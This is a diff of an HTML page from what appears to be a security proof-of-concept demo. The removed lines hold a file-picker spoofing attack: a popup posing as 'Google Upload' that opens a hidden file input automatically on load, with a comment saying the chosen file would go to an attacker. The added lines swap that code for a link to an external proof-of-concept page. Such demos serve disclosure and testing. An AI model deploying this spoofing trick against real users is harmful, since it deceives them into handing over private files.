@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Trigger File Picker in Popup</title>
+    <title>Popup Demo</title>
     <style>
         body {
             display: flex;
@@ -31,65 +31,12 @@
     </style>
 </head>
 <body>
-    <button id="openPopupBtn">Open Popup (Auto trigger file picker)</button>
+    <button id="openPopupBtn">Open Popup</button>
 
     <script>
         document.getElementById('openPopupBtn').addEventListener('click', function() {
-            const popup = window.open('', '_blank', 'width=800,height=600,scrollbars=yes,resizable=yes');
-            if (!popup) {
-                alert("Popup blocked! Please allow popups.");
-                return;
-            }
-            // Tulis konten popup yang sama dengan filepicker-spoofing1, plus auto-trigger
-            popup.document.write(`
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <title>Google Upload</title>
-                    <style>
-                        h1 { margin: 1em; }
-                        a { position: absolute; top: 0; left: 0; right: 0; bottom: 0; }
-                        input { display: none; }
-                        img { width: 100%; }
-                    </style>
-                </head>
-                <body>
-                    <h1>Tap to upload photo to Google</h1>
-                    <input id="fileSelect" type="file" accept="image/*" />
-                    <img id="img">
-                    <a id="link" href="https://google.com" target="_blank"></a>
-                    <script>
-                        // Fungsi untuk memicu file picker dan mengatur onchange
-                        function triggerFilePicker() {
-                            const fileSelect = document.getElementById('fileSelect');
-                            const img = document.getElementById('img');
-                            if (fileSelect) {
-                                fileSelect.click();
-                                fileSelect.onchange = function(event) {
-                                    if (fileSelect.files.length) {
-                                        img.src = URL.createObjectURL(fileSelect.files[0]);
-                                        alert('File selected: ' + fileSelect.files[0].name + ' (This would be sent to attacker)');
-                                    }
-                                };
-                            }
-                        }
-                        // Jalankan otomatis ketika halaman popup siap
-                        window.addEventListener('DOMContentLoaded', function() {
-                            triggerFilePicker();
-                        });
-                        // Juga sediakan fallback jika klik pada h1 (bisa dipertahankan)
-                        const link = document.getElementById('link');
-                        link.onclick = function(e) {
-                            e.preventDefault();
-                            triggerFilePicker();
-                        };
-                    <\/script>
-                </body>
-                </html>
-            `);
-            popup.document.close();
-            popup.focus();
+            // Ukuran popup bisa disesuaikan
+            window.open('https://nuribnuu.github.io/poc-security/filepicker-spoofing1/', '_blank', 'width=800,height=600,scrollbars=yes,resizable=yes');
         });
     </script>
 </body>
